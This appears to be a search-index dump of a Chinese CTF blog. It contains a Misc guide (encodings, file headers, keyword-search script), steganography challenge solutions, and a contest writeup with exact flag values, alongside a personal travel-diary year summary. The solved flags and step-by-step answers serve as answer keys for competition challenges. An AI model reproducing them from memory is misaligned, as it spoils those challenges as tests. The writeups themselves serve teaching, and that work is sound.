[{"categories":["CTF"],"content":"最开始接触CTF时，学的最多的就是Misc，各种编码与加密还有各种软件的使用等等 但Misc涉及的范围实在太广了，于是就想着一边学习一边记录，因而就有了这篇文章 阅前须知 文章更新周期较长，如有疏漏，欢迎指正 若你也对Misc感兴趣或者对本文中的内容有疑问，欢迎加入我的知识星球 进星球后可第一时间获取文章后续更新 文章创作不易，感谢你能看到这里，转载还请标明出处 1、rockstar 编程语言，在github上面可以找到，然后在本地用pip安装库，把rock文件转换为py文件，运行即可得到flag 2、给你一个.exe安装包文件，flag藏在安装之前的一大串协议中 3、实在做不出来的时候，可以把flag的格式转其他的编码和题目中的信息比对找规律 4、给你一个gpx文件，在线网站https://www.gpsvisualizer.com/map_input解密，然后地名的首字母连起来就是flag CTF中的常用关键词 # 要搜索的字符列表 search_items = [ \"key\", \"password\", \"dasctf\", \"k3y\", \"p@ssword\", \"passw0rd\", \"p@ssw0rd\", \"secret\", \"s3cret\", \"s3cr3t\", \"s3cre4\",\"F14ggg\", \"Ic4unq1U\", \"ISCC\" # 遇到⼀个加⼀个，CTFer的好习惯 ] 查找的Python代码： import re # 要搜索的字符列表 search_items = [ b\"key\", b\"password\", b\"dasctf\", b\"k3y\", b\"p@ssword\", b\"passw0rd\", b\"p@ssw0rd\", b\"secret\", b\"s3cret\", b\"s3cr3t\", b\"s3cre4\",b\"F14ggg\" # 遇到⼀个加⼀个，CTFer的好习惯 ] file_path = \"test.txt\" with open(file_path,'rb') as f: data = f.read() for item in search_items: # re.escape(item) 用于转义 item 中的特殊字符, 确保它们被当作普通字符处理 # re.IGNORECASE 标志使得匹配不区分大小写。 regex = re.compile(re.escape(item) + b'.*', re.IGNORECASE) for match in regex.finditer(data): # finditer 返回一个迭代器，每次迭代返回一个匹配对象 matched_text = match.group() # 返回匹配到的完整文本 # 若匹配到，则显示前50个字节 print(f\"[+] Found {item.decode()} match: {matched_text[:50]}...\") # 各种常用关键字的bash64编码 flag Zmxh F14g RjE0 DASCTF REFTQ1RGe s3cr3t czNjcjN0 secret c2VjcmV0 password cGFzc3dvc PNG文件头 iVBORw0KGgo ZIP文件头 UEsDBA 各种文件头/尾 这里要注意，出题人可能会把文件头的小写字母偷偷改成大写，例如：Rar -\u003e RAR zip 文件头：50 4B 03 04 14 00 08 00 rar 文件头：52 61 72 21 (Rar!) 文件尾：C4 3D 7B 00 40 07 00 7z 文件头：37 7A BC AF 27 1C gz 文件头：1F 8B 08 00 png 文件头：89504E47 0D0A1A0A 0000000D 49484452 文件尾：00000000 49454E44 AE426082 jpg 文件头：FF D8 FF E0 00 10 4A 46 49 46 00 01 gif 文件头：47 49 46 38 39 61（GIF89A）或 47 49 46 38 37 61（GIF87A） 文件尾：00 3B bmp 文件头：42 4D psd 文件头：38 42 50 53 TIFF 文件头：49 49 2A 00 mp3 文件头：49 44 33 03 00 00 00 00 wav 文件头：57 41 56 45 或 52 49 46 46 mid 文件头：4D 54 68 64 avi 文件头：41 56 49 20 mov 文件头：00 00 00 20 66 74 79 70 71 74 20 20 20 05 03 00 swf 文件头：46 57 53 08 AC 43 00 00 pyc 文件头：03 F3 0D 0A MS-Office2003 文件头：D0 CF 11 E0 xml 文件头：3C 3F 78 6D 6C html 文件头：68 74 6D 6C 3E CAD (dwg)，文件头：41433130 Rich Text Format (rtf)，文件头：7B5C727466 Email [thorough only] (eml)，文件头：44656C69766572792D646174653A Outlook Express (dbx)，文件头：CFAD12FEC5FD746F Outlook (pst)，文件头：2142444E MS Access (mdb)，文件头：5374616E64617264204A WordPerfect (wpd)，文件头：FF575043 Postscript (eps.or.ps)，文件头：252150532D41646F6265 Adobe Acrobat (pdf)，文件头：255044462D312E Quicken (qdf)，文件头：AC9EBD8F Windows Password (pwl)，文件头：E3828596 Real Audio (ram)，文件头：2E7261FD Real Media (rm)，文件头：2E524D46 MPEG (mpg)，文件头：000001BA 或 000001B3 Quicktime (mov)，文件头：6D6F6F76 Windows Media (asf)，文件头：3026B2758E66CF11 M4a，文件头：00000018667479704D3441 各种加密/编码 进制转换 二进制 首先我们要知道可打印字符(包括空格)的Ascii码的范围在 32-126 因此在二进制的情况下，应该在 00100000 - 01111110 这个范围 所以当我们拿到一串经过变换的二进制字符串，可以根据这个范围来猜测变换 举个例子： data = \"1100001 000011 0111011 1110011 0100111 001011 0010111 1010111 100011 1000011 0010111 1001011 1111011 0111011 100001 100001 1001101 000011 1010111 1111101 0001011 1000011 0110111 110011 1111101 0000111 1000011 1100111 1100111 1010011 0010011 1111101 0010111 0001011 110011 1111101 0110011 1001011 0100111 1100111 0010111 1111101 0011011 110011 0110111 1010011 100011 100001 100001\".split() for item in data: print(chr(int(item[::-1],2)), end = '') 例题1-2023 CISCN初赛 Tough_DNS 三进制 这里放一道比较有意思的例题 注意到每隔五个手必然是点赞，猜测点赞是分隔符，剩下只有三个符号，可以联想到三进制 flag四个字母的三进制分别是10210 11000 10121 10211，所以 布对应1 剪刀对应2 石头对应0，按规律依次转换即可 data = \"10210 11000 10121 10211 11120 11002 1211 10200 1220 10112 10001 2222 10002 10112 11021 10222 1211 11000 11000 11112 11122\".split() for item in data: print(chr(int(item,3)),end='') # flag{n1c3_RPS_sk1llz} 四进制 from Crypto.Util.number import long_to_bytes data = \"121212301201121313230311120103100320030212011210121102310301030012111210023103100321030003110231120103200320031202310303031203210320031003121210030203131201030003201331\" print(long_to_bytes(int(data,4))) # b'flag{5a482ade-10ed-4905-a886-369846d27a08}' 例题1-2025 能源网络安全大赛 Bluetooth 例题2-20","date":"2025-12-20","objectID":"/posts/1ad9200/:0:0","tags":["Misc","CTF"],"title":"[持续更新] CTF-Misc Guide","uri":"/posts/1ad9200/"},{"categories":["CTF"],"content":"用这篇博客来记录一下知识星球里朋友们问的一些 Misc 题 本文涉及的大部分题都来自于师傅们的提问，因此文中就不放具体附件的下载链接了 如有需要本文中涉及的题目附件，可以进我的 知识星球 获取 阅前须知 因为本文的题目大都来源于群友的提问，因此我文章中就不放具体的附件下载链接了 如果有需要题目附件的师傅，可以进我的 知识星球 获取附件下载链接 题目名称 sunset 题目附件给了下面这张图片 上手用 zsteg 扫一下，发现 RGB 三个通道中都藏了一个压缩包 因此我们用以下命令分别导出三个压缩包 zsteg -e b1,r,lsb,xy sunset.png \u003e 1.zip zsteg -e b1,g,lsb,xy sunset.png \u003e 2.zip zsteg -e b1,b,lsb,xy sunset.png \u003e 3.zip 解压后分别得到 r.txt g.txt b.txt ，因此猜测是分别导出了三个通道的 hexdump 我们使用以下脚本把三个通道的数据组合一下 def read_channel_data(file_path): with open(file_path, 'r') as file: channel_data = file.readlines() formatted_data = [] for line in channel_data: data = line.split() formatted_data.append(data[0] + data[1]) return ''.join(formatted_data) def combine_channels_to_bytes(r_data, g_data, b_data): binary_data = '' for r, g, b in zip(r_data, g_data, b_data): r_binary = bin(int(r, 16))[2:].zfill(4) g_binary = bin(int(g, 16))[2:].zfill(4) b_binary = bin(int(b, 16))[2:].zfill(4) # 逐位读取RGB合并后的二进制数据 binary_data += ''.join(a + b + c for a, b, c in zip(r_binary, g_binary, b_binary)) byte_data = bytes([int(binary_data[i:i+8], 2) for i in range(0, len(binary_data), 8)]) return byte_data def main(): # 读取并格式化 R、G、B 通道数据 r_data = read_channel_data('r.txt') g_data = read_channel_data('g.txt') b_data = read_channel_data('b.txt') # 合并通道数据成字节数据 byte_data = combine_channels_to_bytes(r_data, g_data, b_data) # 将字节数据写入文件 with open('1.zip', 'wb') as f_out: f_out.write(byte_data) print('Done') if __name__ == \"__main__\": main() 组合后可以得到一个 zip 压缩包，解压后即可得到 flag 题目名称 大威天龙 题目附件给了一个DOC和一个加密的RAR压缩包 RAR压缩包的注释中有提示 然后用010打开那个doc，发现其实是一个ZIP压缩包 改后缀为.zip然后解压，在gogog路径下可以得到一张JPG图片 结合之前RAR注释中的提示，猜测就是steghide隐写，因此我们直接使用stegseek进行爆破 可以得到一个txt文件，内容如下 因此压缩包解压密码就是：恭喜你找到了rar压缩包的密码，快去解压吧！ Tips:这里有的师傅用010打开会发现看不到中文，是因为这里使用的是GBK编码，可以使用记事本或者CyberChef查看 解压RAR压缩包后可以得到一张PNG图片和一个filename.c的代码 猜测图片被这个代码加密了，因此我们尝试逆向这个代码，结果发现原来的Python代码就写在注释里 因此直接写个脚本还原一下flag.png即可，还原后可以得到一张二维码 from PIL import Image img = Image.open(r\"out.png\") width,height = img.size pix = img.load() new_img = Image.new(\"RGBA\", img.size) new_pix = new_img.load() for y in range(height): for x in range(width): b, a, r, g = pix[x, y] # 恢复亮度和对比度 r = (r - 10) / 0.01 g = (g - 10) / 0.01 b = (b - 10) / 0.01 a = (a - 10) / 0.01 new_pix[x, y] = (int(r), int(g), int(b), int(a)) new_img.show() new_img.save(r\"flag.png\") 最后扫码即可得到flag：flag{5fbb5f2b0f9234576d2742f225044463} 题目名称 外星的凯撒凯撒凯撒 解压附件，可以得到一个DOCX还有一个加密的压缩包 打开DOCX文件，发现里面有一部分文字是白色的，直接全部修改为红色并去除所有格式 然后发现有很多行base64编码，猜测是base64隐写 直接PZ解base64隐写可以得到：The ciphertext is:I0qwVtx2ft 然后我们在DOCX中调大缩放，可以看到有一个4music.wav的图标，直接双击即可打开一个wav 播放发现是SSTV，扫描后可以得到密钥：ccttttf 然后维吉尼亚解密即可得到压缩包解压密码：G0odCae2ar 使用得到的密码解压压缩包后可以得到一个flag.xlsx 把后缀改为.zip然后解压，在sheet1.xml中可以发现有很多内容，因此猜测是设置了特殊格式 然后根据 400行x400列 猜测是藏了一个二维码 因此我们打开flag.xlsx文件，仔细观察发现有的单元格字体是加粗的，我们把加粗的单元格都涂黑 然后调整一下列宽得到一张二维码 最后扫码即可得到flag：flag{Cae2ar+Cae2ar+Cae2ar+...=Vigenre} 题目名称 图的点很奇怪 题目附件给了一张PNG图片还有一个加密的ZIP压缩包，猜测需要从PNG图片中获取压缩包的解压密码 用010打开这张PNG图片，提示报错，仔细观察发现是图片chunk的CTYPE被修改了，尝试改回IDAT 然后发现图片末尾有多余的数据，尝试删除多余的数据 多余的数据删除后，图片就可以正常显示了，010中打开也没有报错了 放大图片查看，发现图片中有很多间隔相同的小点，猜测是隐写了另一张图片 因此我们尝试提取等距像素点，可以提取出来下面这张图片 因此压缩包的解压密码就是：$df\u0026vK1RGqoj，用得到的压缩包密码解压后可以得到下图 010打开上图，发现末尾藏了一张数据逆置后的PNG图片 直接把末尾的数据复制出来CyberChef转换一下即可得到flag：flag{d4405ce1-3aac-ffb1-68af11-7d93e2066a} 题目名称 cat(技能兴鲁) 题目附件给了一个cat_encode.py还有一张cat.png cat_encode.py的内容如下 def arnold_encode(image, shuffle_times, a, b): arnold_image = np.zeros(shape=image.shape) h, w = image.shape[0], image.shape[1] N = h for time in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): new_x = (1*ori_x + b*ori_y)% N new_y = (a*ori_x + (a*b+1)*ori_y) % N arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :] image = np.copy(arnold_image) cv2.imwrite('cat.png', arnold_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0]) return arnold_image 很明显就是经典的arnold猫脸变换了，但是没有给我们shuffle_times、a、b 因此猜测需要我们进行爆破，编写以下脚本进行爆破即可，当然能爆破的前提是三个值都不会太大 import matplotlib.pyplot as plt import cv2 import numpy as np def arnold_decode(image, shuffle_times, a, b): \"\"\" decode for rgb image that encoded by Arnold Args: im","date":"2026-01-09","objectID":"/posts/bb1da35/:0:0","tags":["CTF","Misc"],"title":"星球朋友们问的一些来路不明的题","uri":"/posts/bb1da35/"},{"categories":["CTF"],"content":"用这篇博客来记录一下本人在比赛中遇到的一些疑难题（本人尚未解出的题） 如果师傅们有进一步的想法或者做出来了，可以联系我一起交流一下解题思路 阅前须知 这篇博客可以算是本人的求助贴，因此本文中的大部分内容并不适合刚接触Misc方向的新同学 尝试本文中提到的相关题目可能会耗费大量时间，请各位读者量力而行【慎行】 [SOLVED] 题目名称 nothing (2024 蓝桥杯全国总决赛) 题目附件： https://pan.baidu.com/s/1eGIfajRXx3uqjlk54CaZ1g?pwd=ax6g 提取码: ax6g 下载附件，得到一个noting.zip，打开发现是DOCX的结构 因此改后缀为.docx并打开，发现有一张白色的图片，还有一段白色的文字：什么都没有 可以把DOCX作为ZIP解压，然后直接从noting\\word\\media路径中把这张白色图片image1.png提取出来 图片的大小是34x34，我们把图片分通道提取出来，猜测存在LSB隐写 仔细观察各通道的数据，发现RGBA的0通道中都隐写了信息 RGBA里面都有LSB的数据，按道理来说一共就4x3x2x1=24种排列组合，爆破一下组合的顺序应该就能得到flag 但是我尝试后并没有发现flag，下面放的是我尝试的提取LSB数据的脚本 from PIL import Image import libnum import itertools img = Image.open(\"image1.png\") width,height = img.size # print(width,height) 34 34 r = [] g = [] b = [] a = [] for y in range(height): for x in range(width): pixel = img.getpixel((x,y)) r.append(pixel[0]\u00261) g.append(pixel[1]\u00261) b.append(pixel[2]\u00261) a.append(pixel[3]\u00261) channels = ['r', 'g', 'b', 'a'] color_arrays = {'r': r, 'g': g, 'b': b, 'a': a} permutations = itertools.permutations(channels) for perm in permutations: res = \"\" for i in range(len(r)): for channel in perm: res += str(color_arrays[channel][i]) print(f\"[+] {' '.join(perm)}\") print(libnum.b2s(res)) print() 后来在@byxs20师傅的帮助下，获得了新的解题思路，其实这张图片种一共就一下五种像素点 (255, 255, 255, 255) (255, 255, 255, 254) (255, 255, 254, 255) (255, 254, 255, 255) (254, 255, 255, 255) 其中(255, 255, 255, 255)像素是没有隐写数据的，然后另外几个像素分别按照254的位置用四进制隐写了数据 这里为啥能想到(255, 255, 255, 255)像素是没有隐写数据的呢？ 因为如果师傅们尝试把不同像素的坐标打出来，可以发现这个像素是主要集中在前两列和第三列的前16个像素的 因此比较有经验的Misc师傅就会感觉到，大段连在一起的相同像素是不存在隐写数据的，因此需要把这个像素剔除 并且这里这样的排列方式，也提示了我们后续步骤中提取像素点需要按列提取 具体的对照表如下： table = { (255, 255, 255, 254):0, (255, 255, 254, 255):1, (255, 254, 255, 255):2, (254, 255, 255, 255):3 } 然后具体隐写的原理就是每轮的值x4，再加上当前的四进制值，最后可以得到一个长整型，具体解密代码如下： def extract_data_from_img(img_name): img = Image.open(img_name) width,height = img.size # 四进制的表 table = { (255, 255, 255, 254):0, (255, 255, 254, 255):1, (255, 254, 255, 255):2, (254, 255, 255, 255):3 } raw_long = 0 # 按列提取 for x in range(width): for y in range(height): pixel = img.getpixel((x,y)) if pixel != (255, 255, 255, 255): # print(pixel) raw_long = raw_long*4+table[pixel] print(raw_long) data = long_to_bytes(raw_long) print(data) with open(\"out.zip\",'wb') as f: f.write(data) 还得是感谢B神脚本提供的思路，要不然根本想不到这个原理 运行以上脚本后就可以得到一个ZIP压缩包，但是Windows下直接打开是看不到内容的 因为被压缩的文件内容包括文件名都是 \\r、\\n、\\t、空格 这种空白字符 因此我们在Linux下使用脚本解压并提取其中的内容（因为Windows下看不到文件名为空格的文件） 然后里面内容的加密方式其实和上面的原理是一样的，也是四进制，就是具体的对照表是未知的 但是因为一共就四种字符，所以我们可以直接爆破一下 def blankbytes_decode(raw, blank_character): raw_long = 0 for c in raw: for i in range(len(blank_character)): if c == ord(blank_character[i]): raw_long = raw_long * 4 + i return long_to_bytes(raw_long) def blankbytes_brute(raw): blank_character_base = [b\"\\x09\", b\"\\x0a\", b\"\\x0d\", b\"\\x20\"] for perm in permutations(blank_character_base): print(f\"Testing permutation: {perm}\") try: result = blankbytes_decode(raw, perm) print(f\"Decoded result: {result}\") except Exception as e: print(f\"Error with permutation {perm}: {e}\") 爆破后即可得到正确的表和最后的flag：flag{46eade75-846b-4d26-98f7-2cb3cb4686ed} 完整的解题脚本如下： from Crypto.Util.number import long_to_bytes from itertools import permutations from PIL import Image import pyzipper def extract_data_from_img(img_name): img = Image.open(img_name) width,height = img.size # 四进制的表 table = { (255, 255, 255, 254):0, (255, 255, 254, 255):1, (255, 254, 255, 255):2, (254, 255, 255, 255):3 } raw_long = 0 # 按列提取 for x in range(width): for y in range(height): pixel = img.getpixel((x,y)) if pixel != (255, 255, 255, 255): # print(pixel) raw_long = raw_long*4+table[pixel] print(raw_long) data = long_to_bytes(raw_long) print(data) with open(\"out.zip\",'wb') as f: f.write(data) def blankbytes_decode(raw, blank_character): raw_long = 0 for c in raw: for i in range(len(blank_character)): if c == ord(blank_character[i]): raw_long = raw_long * 4 + i return long_to_bytes(raw_long) def blankbytes_brute(raw): blank_character_base = [b\"\\x09\", b\"\\x0a\", b\"\\x0d\", b\"\\x20\"] for perm in permutations(blank_character_base): ","date":"2025-12-16","objectID":"/posts/d0736a7/:0:0","tags":["CTF","Misc"],"title":"CTF-Misc \"雅\"题共赏","uri":"/posts/d0736a7/"},{"categories":["年终总结"],"content":"2025 感觉也是非常特别的一年吧，从本科毕业然后正式入学研究生学校 这一年下来也是多有感悟，思想和心态也随经历和环境改变了很多 由于本篇内容不是技术博客，就想着用尽可能接地气的言语叙述了 无奈本人文笔退化，还望各位多多包涵 由于这篇博客跨越的时间点比较特殊，毕竟是从本科毕业并告别了自己的生活了四年的大学校园，这里就用我最喜欢的一张浙师的照片开篇吧 一月 北京 本来计划的是元旦和对象一起出去玩的，结果一看日历发现25年的元旦只放假一天，因为没有和周末连起来 所以今年的跨年就只能和同门在北京的出租屋里跨年了（因为读研提前进组了 不过那天晚上很幸运的是在闲鱼上买到了阳坊涮肉的优惠券，289代500 因此就和同门一起去阳坊爽吃涮肉去了，因为是跨年夜，所以人也比较多，排队大概排了一个多小时吧 然后两个人几乎把能点的肉全点了一遍，然后发现还凑不满500，就又加了点甜品和饮料（吃爽了真的 由于换手机了，那时候拍的照片也找不到了 如果北京有能让我值得留念的东西的话，我感觉阳坊涮肉绝对能算上一个 就是这里有一点很坑的是，阳坊有好多种，什么阳坊涮肉、阳坊胜利涮肉、阳坊大都刷头 我感觉还是阳坊涮肉比较好吃，然后肉的种类也更多，虽然会比阳坊大都贵一点 还有吃涮肉前特别重要一点就是，要看看那家店的锅是不是用碳火的，像有些开在商场里的阳坊胜利涮肉，很多是用电的 用电的涮肉会特别慢，然后肉可能没办法涮的很熟，可能会煮了很久还是红色的情况 综上，吃涮肉还得是用碳火的，然后强烈推荐沙河那家：【阳坊涮肉北京市昌平区沙河店】 其实自己生日也在一月初，不过今年好像连自己都不太在意了，也没有发朋友圈或者出去吃个饭啥的 然后由于和对象也是异地的状态，也没办法搞得很有仪式感，不过她还是很贴心的给我美团买了一个榴莲千层小蛋糕 本地照片找不到了，后续如果找到再放上来 一月中旬得益于北邮宿舍装修，借着会影响到学生休息这个原因，学长学姐们都提早回家线上远程办公了 虽然我和同门住在出租屋里不会受到这个影响，但是由于学长学姐们都走了，留我们几个研0的在实验室也干不了啥 于是我就和导师说做完收尾工作，配置好远程办公环境后就飞回家了，毕竟本科的毕设还没写完，需要留点时间写毕设 到家后就是收拾收拾东西准备过年了，好像上大学后真正待家里陪爸妈的时间就突然骤减了 周末和节假日不是忙于各种竞赛就是计划着和同学出去玩，不过可能是因为我本人就是属于那种在家里待不住的人吧 感觉待在家里就干不了啥事情，因此平常也不是很想回家 二月 温州 然后就是回温过年了，这期间还得到了一个给准备报考四川大学少年班的高二学生培训CTF的机会 当然是好几个师傅一起的，我的话主要就是负责Misc方向，学生水平都不差而且都挺好学的，最后也是顺利结束挣了点零花钱 并且后来到真正考试的时候，发现 Web和Misc 这两个方向的占比是最高的，然后Misc考的所有知识点我都讲到了（win！ 最后等高考成绩出来，发现也是有几个学生顺利进入了川大少年班，也是挺欣慰的吧 挣着的这点零花钱也是全花在后面的云南之行上了，甚至入不敷出，还要自己贴一点 云南·昆明 这两年一直有个习惯，就是和对象在春节后元宵一起去远一点的地方走一走，趁着还没开学，并且刚刚好这个时间段出门旅行的人不算太多 去年去的广州和潮汕，今年就来到了云南。感觉云南离浙江还是有点远的然后又都是自费，所以对于两个还在上学的大学生来说开销还是比较大的 我们云南的第一站是昆明，因为俩人都害怕高反，所以就打算在去丽江和香格里拉前，先在昆明和大理适应一下 昆明的话就是先去逛了翠湖公园和昆明老街，然后去了斗南花市和捞鱼河湿地公园 网上说斗南花市的花都很便宜，但是实地去了后发现好像也没便宜多少，两个人逛了一圈后买了两个花环和一束鲜花就去捞鱼河湿地公园了 我们去的时候正好赶上傍晚太阳落山，岸边还有很多的海鸥，这里的海鸥游客是可以投喂的 这里的照片找不到了，后续如果找到了的话再补上来 云南·大理 离开了昆明后我们第二站来到了大理，在昆明的时候没咋感觉到高反 但是一到大理就突然发现嘴唇发紫并且很干，上网一搜发现这就是高反的症状之一，因为血氧浓度降低了 大理的话我们是先去了大理古城，也是在大理古城拍出了我的年度照片 逛了逛大理古城，发现古城其实商业化还是挺严重的，然后顺便尝了尝大众点评上高分的米线 看上去挺好的，也挺出片的，就是吃完后感觉性价比其实一般般 逛完古城后，我们就去洱海了，住宿的话就选在了洱海的S湾的一家民宿，好像这边民宿比连锁酒店要方便 本科集训队里刚刚好有个学妹是大理的，因此在她的帮助下住上了800多一晚的民宿（这真的是我到目前为止住的最贵的酒店了 民宿的老板人很好，然后民宿的环境也很好，连音响都是 marshall 的 WOBURN 这里有个小插曲就是，民宿老板看我们俩这么年轻，还特地问了问我们是不是做自媒体的（难绷 酒店房间里有个270度的落地窗，窗外就是洱海，景色超级好，第二天也是成功在酒店房间里躺着看到了洱海的日出 感觉真正看到日出的那一刻，虽然睡眼惺忪，困的眼睛都睁不开，但是实话说内心还是充满力量的 也正是应了那首歌：淋雨一直走，晒到阳光就会暖和~ 然后酒店的早餐也是民宿老板亲自现做的，米线非常的好吃 这顿丰盛早餐的照片也是丢失了，如果后面能找到的话再补上来吧 然后我们就沿着洱海的生态廊道一直走，这个生态廊道很长，因此提供了共享电动车，就是最快好像只能开20码 一开始走了弯路，扫了比较慢和比较小的那种，浪费了挺多时间，其实性价比最高的是那种像自行车一样高高的电动车，开的贼快 去年俩人是在南澳岛骑着小电驴环岛，今年是骑着小电驴环洱海，感觉电动车是一个挺有幸福感的一个东西 也是顺着生态廊道，俩人一路骑到了喜洲古镇 感觉喜洲古镇的商业化就没有那么严重，很多建筑还是保留了那种厚重的年代感 云南·丽江 云南的第三站我们来到了丽江，首先是去了丽江古城，感觉这种古城商业化后都大差不差，甚至很多店都是一样的 因此我们其实没有很关注古城里的商家和店面，到了后我们先去了红太阳广场，然后在附近的一家小馆子里吃了晚饭 小菜馆虽然店面不大，但是慕名而来的游客很多，然后很多人可能会选择拼桌来吃上这里的菜 其实吃饭的时候听到隔壁拼桌的人聊天，发现真的很神奇，大家都从不同的地方大老远的跑过来，然后坐在一张方桌上吃饭 丽江第二天，我们计划的是起个大早，去玉龙雪山看日照金山 怕上山后遇到高反，我还特地买了6罐氧气和一堆类似于高原安、葡萄糖这种因对高反的保健品 结果上山后，发现啥事没有，俩人到最后连一瓶氧气都没吸完。。 其实这里还有一个很遗憾的点就是，我们去的那天刚刚好因为天气原因，4680的冰川公园大索道不开放了 然而我一个本科室友前一天去的，正好开放，因此也比较遗憾吧，毕竟自己最想去的就是这个4680冰川公园 或许遗憾本就是人生常态吧，不过也算是给自己下一次来留一点悬念吧 4680去不了，我们只能看看日照金山然后转战牦牛坪了 不过由于那天的天气条件好像不是特别好，因此看到的日照金山就不是特别的明显 然后这里还有个小插曲就是，可能是由于我过于兴奋，导致定的出发时间太早，到日照金山观景点的时候天都还没亮 俩人只能在黑乎乎的荒郊野岭瑟瑟发抖地等待日出（好吧，我承认，是我的锅 照片感觉始终拍不出那种震撼人心的感觉，照片中的景色和人眼中看到的景色始终有差距 这也是为啥人们一直追求更好的设备的原因吧，总想着把当下人眼中看到的震撼记录下来 牦牛坪的这个湖好像是因为铜离子含量比较高，所以整个湖的湖水都是明显的蓝绿色 逛完玉龙雪山后，我们就准备去往云南之行的最后一站——香格里拉 不过在高铁站的时候，才发现氧气瓶是没法上高铁的，因此包里5罐全新的氧气瓶就被扣留在进站口安检的地方了 云南·香格里拉(迪庆藏族自治州) 我俩一致认为香格里拉是本次云南之行最好玩的地方，我们到的那天香格里拉刚刚好下了很大的雪 但是丽江的天气很好，没有下雪，去香格里拉前也没提前查天气，所以一下高铁看到外面飘的雪花，心里就忍不住欣喜 感觉就是有那种坐着列车到了“雪国”，感觉下雪就是会给人一种放松，心灵被净化的感觉 在香格里拉，我们住也是民宿，民宿在独克宗古城里，老板人很好，我们一到高铁站，就来接我们回民宿了 我们到民宿放完东西后就出门探索去了，去独克宗古城外找了一家火锅店吃了牦牛火锅 感觉还得是少数民族，火锅店里还有老板驻唱服务，然后唱的也是少数民族他们自己的民谣 有点记不清那天是不是元宵了，独克宗古城的广场上有很多人在放烟花和跳舞，感觉就很有过年的气息 大雪加上烟花以及广场中央跳舞的人群，真的会给人带来很幸福很温暖的感觉 然后我们还去了网上很火的那个全世界最大的转经筒，其实从上面的图片可以看出来 这个转经筒是在半山腰上，幸好我那个时间段去香格里拉的游客不多，感觉旅游体验上还是非常的令人满意 其实这么一路走过来，感觉到香格里拉后已经适应的差不多了，但是那天晚上对象还是有点高反 因此俩人也不敢洗澡，并且查了小红书，紧急买了两瓶可乐喝一下（说是能缓解高反 一觉醒来，屋外的雪已经积起来了，而且感觉挺厚的 然后也是在大雪中找了一家早餐店，点了牦牛肉炒饭和酥油茶 炒饭很香，酥油茶也很好喝，是我喜欢的那种味道 然后那天就是在古城找了一家妆造店，画了他们藏族的妆造并且让摄影师拍了几张在大雪中的照片 拍完妆造后，稍微逛了逛古城就准备坐高铁离开这个幸福的地方了 感觉待惯了现代化的城市后，时不时来这种古城里住一住，身心确实可以得到放松，幸福感++ 这整趟云南之行其实只花费了一周左右的时间，但是感觉行程非常的充实，去的四个地点都给人带来不一样的感觉 尤其是下着大雪的香格里拉，幸福得总是让我不自觉的怀念","date":"2026-01-05","objectID":"/posts/6cc9a96/:0:0","tags":["年终总结"],"title":"2025 年终总结","uri":"/posts/6cc9a96/"},{"categories":["Writeup"],"content":"2025 古剑山全国大学生网络攻防大赛 Misc Writeup 本文中涉及的具体题目附件可以进我的 知识星球 获取 题目名称 水果 附件给了下面这张 JPG 图片 010 打开，发现末尾有个 zip 手动提取出来并解压，可以得到一个oursecret.txt，内容如下： 5L2g6L+Z6Iu55p6c5oCO5LmI6L+Z5LmI5aSnCuWkp+S4quWEv+aJjeWAvOmSseS9oOimgeS4jeimgQrov5nmoYPlrZDmgI7kuYjov5nkuYjnoawK56Gs5piv5Zug5Li65paw6bKc5L2g6KaB6L2v55qE6L+Y5piv57Ov55qECui/meilv+eTnOiDveWQg+WQl+eci+i1t+adpeacieeCueS4jeeGnwrkuI3nhp/nmoTopb/nk5zmgI7kuYjlj6/og73kvaDov5nlsLHmmK/nrYnnnYDlkIPnlJznmoQK5L2g6L+Z5p+a5a2Q6L+Z5LmI5bCPCuWwj+W3p+eahOaJjeWlveWQg+S9oOimgeWkp+S4queahOi/mOaYr+WlveWQg+eahArov5nmqZnlrZDmgI7kuYjov5nkuYjphbgK6YW45omN5piv5q2j5a6X55qE5qmZ5a2Q5L2g6KaB5piv55Sc55qE5Y675Yir5a6255yLCui/memmmeiVieacieeCueW8rwrlvK/nmoTpppnolYnmm7TnlJzkvaDkuI3mh4IK5L2g6L+Z5qKo5a2Q5piv5LiN5piv5pyJ54K556GsCuehrOaYr+WboOS4uuaWsOmynOWQg+edgOacieWPo+aEnwrov5nokaHokITmgI7kuYjov5nkuYjlsI8K5bCP55qE6JGh6JCE5pu05rWT57yp55Sc5ZGz base64解码一下可以得到 16 行不同的字符串 你这苹果怎么这么大 大个儿才值钱你要不要 这桃子怎么这么硬 硬是因为新鲜你要软的还是糯的 这西瓜能吃吗看起来有点不熟 不熟的西瓜怎么可能你这就是等着吃甜的 你这柚子这么小 小巧的才好吃你要大个的还是好吃的 这橙子怎么这么酸 酸才是正宗的橙子你要是甜的去别家看 这香蕉有点弯 弯的香蕉更甜你不懂 你这梨子是不是有点硬 硬是因为新鲜吃着有口感 这葡萄怎么这么小 小的葡萄更浓缩甜味 然后根据上面文件名的提示，以及压缩包末尾多余数据的特征，应该还有 oursecret 隐写 经过尝试发现解密的密钥就是水果的拼音：shuiguo 解密后可以得到一个 flag.txt，内容如下： 你这柚子这么小 你这柚子这么小 你这柚子这么小 你这梨子是不是有点硬 你这柚子这么小 大个儿才值钱你要不要 你这柚子这么小 小巧的才好吃你要大个的还是好吃的 小巧的才好吃你要大个的还是好吃的 弯的香蕉更甜你不懂 硬是因为新鲜你要软的还是糯的 硬是因为新鲜你要软的还是糯的 你这柚子这么小 不熟的西瓜怎么可能你这就是等着吃甜的 硬是因为新鲜你要软的还是糯的 这桃子怎么这么硬 硬是因为新鲜你要软的还是糯的 不熟的西瓜怎么可能你这就是等着吃甜的 硬是因为新鲜你要软的还是糯的 酸才是正宗的橙子你要是甜的去别家看 硬是因为新鲜你要软的还是糯的 你这柚子这么小 硬是因为新鲜你要软的还是糯的 你这苹果怎么这么大 你这柚子这么小 大个儿才值钱你要不要 硬是因为新鲜你要软的还是糯的 小巧的才好吃你要大个的还是好吃的 硬是因为新鲜你要软的还是糯的 酸才是正宗的橙子你要是甜的去别家看 你这柚子这么小 这西瓜能吃吗看起来有点不熟 你这柚子这么小 这桃子怎么这么硬 你这柚子这么小 硬是因为新鲜你要软的还是糯的 硬是因为新鲜你要软的还是糯的 你这柚子这么小 硬是因为新鲜你要软的还是糯的 酸才是正宗的橙子你要是甜的去别家看 你这柚子这么小 这桃子怎么这么硬 硬是因为新鲜你要软的还是糯的 你这柚子这么小 硬是因为新鲜你要软的还是糯的 小巧的才好吃你要大个的还是好吃的 硬是因为新鲜你要软的还是糯的 这西瓜能吃吗看起来有点不熟 